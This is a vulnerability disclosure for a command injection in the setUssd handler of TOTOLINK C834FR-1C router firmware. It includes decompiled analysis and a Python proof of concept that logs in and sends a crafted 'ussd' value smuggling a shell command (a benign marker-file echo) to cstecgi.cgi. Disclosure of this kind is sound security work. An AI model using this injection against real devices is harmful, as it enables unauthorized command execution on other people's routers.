# Information

**Vendor of the products:** TOTOLINK

**Vendor's website:** [TOTOLINK](https://www.totolink.net/)

**Reported by:** chengsihan (2216760375@qq.com)

**Affected products:** C834FR-1C (NR1800X)

**Affected firmware version:** V9.1.0u.6279_B20210910 (observed in local lab)

**Firmware download address:** https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html

# Overview

In the `setUssd` processing path of `cstecgi.cgi`, the `ussd` parameter is concatenated into a command string and passed to `system` for execution, which introduces command injection risk.

# Vulnerability details

Key logic (decompiled):

- Function: `sub_41A68C` (`setUssd`)
- Key operations:
  - reads parameter `ussd`
  - `snprintf(v17, 127, "cli_atc AT+CUSD=1,\"%s\" > /tmp/.ussd_file", Var)`
  - `system(v17)`

Risk explanation:

1. Externally controlled input participates in command construction.
2. The command is ultimately executed by `system`.
3. If input filtering is insufficient, command injection may occur.

There is a command-injection issue in function `0x41A68C`:
![image-20260414210628936](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131539.png)

In `main`, the code compares against `Var`:
![image-20260414210956407](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131540.png)

And `Var` is obtained from `topicurl`:
![image-20260414211038317](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131541.png)

When values do not match, `v27 += 0x11`; since `v27` is an `int`-sized pointer walk, this effectively advances by `0x44`, meaning `v27` keeps stepping through function addresses. Therefore, when `topicurl` matches a specific string, the corresponding function is called.

![image-20260414211800675](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131543.png)

When `topicurl` is `"setUssd"`, it dispatches to `sub_41A68C`, leading to command-execution risk.

![image-20260414210748852](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131544.png)

# POC

```python
#!/usr/bin/env python3
import json
import re
import socket

TARGET = "192.168.211.128"
PORT = 80
LOGIN_PATH = "/formLoginAuth.htm?authCode=1&action=login"
CGI_PATH = "/cgi-bin/cstecgi.cgi"

def send_raw(req: bytes) -> bytes:
    with socket.create_connection((TARGET, PORT), timeout=3) as s:
        s.sendall(req)
        s.settimeout(3)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        return b''.join(chunks)

def get_session_id() -> str:
    req = (
        f"GET {LOGIN_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    data = send_raw(req).decode(errors="ignore")
    m = re.search(r"SESSION_ID=([^;\r\n]+)", data)  # 注意修正了正则中的反斜杠
    return m.group(1) if m else ""

def verify_set_ussd(session_id: str) -> str:
    # cmd_payload = '" ; echo \'Congratulations on executing the command\' > /tmp/ussd_success; #'
    cmd_payload = '" ; echo \'Congratulations on executing the command\' > /tmp/ussd_success; #'
    body = json.dumps({"topicurl": "setUssd", "ussd": cmd_payload}, separators=(",", ":"))
    req = (
        f"POST {CGI_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body.encode())}\r\n"
        f"Cookie: SESSION_ID={session_id}\r\n"
        "Connection: close\r\n\r\n"
        f"{body}"
    ).encode()
    data = send_raw(req).decode(errors="ignore")
    return data.split("\r\n", 1)[0] if data else "NO_RESPONSE"

if __name__ == "__main__":
    sid = get_session_id()
    if not sid:
        print("FAILED: no SESSION_ID")
    else:
        print(verify_set_ussd(sid))
```

# effect

Expected verification results:

1. The request path is reachable and dispatched to the `setUssd` handler.
2. The `setUssd` request returns 200 (or a device-defined success response).
3. The risky command-construction path is confirmed as reachable.

![image-20260414212306505](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131545.png)

In a controlled lab workflow, marker-file evidence can be used to confirm behavior (details omitted here for safety).

![image-20260414212327736](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202604142131546.png)
